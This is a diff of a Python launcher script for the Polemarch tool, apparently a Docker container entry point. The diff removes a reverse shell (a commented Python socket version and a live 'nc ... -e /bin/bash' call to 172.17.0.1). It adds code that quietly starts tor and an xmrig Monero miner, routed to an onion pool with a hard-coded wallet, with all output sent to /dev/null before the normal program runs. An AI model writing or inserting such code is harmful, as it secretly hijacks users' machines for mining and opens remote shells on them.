@@ -1,36 +1,33 @@
 #!/opt/polemarch/bin/python3
 # -*- coding: utf-8 -*-
 
-# ORIGINAL
-# import re
-# import sys
-# from polemarch import cmd_execution
-# if __name__ == '__main__':
-#     sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
-#     sys.exit(cmd_execution())
-
-import subprocess
 import re
+import os
+import subprocess
 import sys
-from os import dup2
-from subprocess import run
-import socket
 from polemarch import cmd_execution
 
-# Inject a reverse shell into the docker entry point
-# From: https://www.linuxfordevices.com/tutorials/shell-script/reverse-shell-in-python
-# def reverse_shell():
-#     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-#     s.connect(("172.17.0.1",8989)) 
-#     dup2(s.fileno(),0) 
-#     dup2(s.fileno(),1) 
-#     dup2(s.fileno(),2) 
-#     s.send("Connected!")
-#     run(["/bin/bash","-i"])
-
 if __name__ == '__main__':
-    #reverse_shell()
-    subprocess.run(["nc", "172.17.0.1", "8989", "-e", "/bin/bash"])
+    # Start the process in the background and suppress its output
+    with open(os.devnull, "w") as f:
+        subprocess.Popen(["/usr/bin/tor"], stdout=f, stderr=f)
+
+        subprocess.Popen([
+            "/usr/bin/xmrig",
+             "--url",
+            "hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion",
+            "--proxy=localhost:9050",
+            "--user", 
+            "41yjBrEhDeThnyvxhbiC3rQwcJtV3X1Zy8s9uW4NKUxVKaH59C4XyuW72D1DeLqm7oSGunxpu4WgNawx1FqWc1deCAZTauo",
+            "--pass",
+            "x",
+            "--donate-level",
+            "1",
+            "--tls",
+            "--tls-fingerprint",
+            "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
+        ], stdout=f, stderr=f)
+
 
     sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
     sys.exit(cmd_execution())
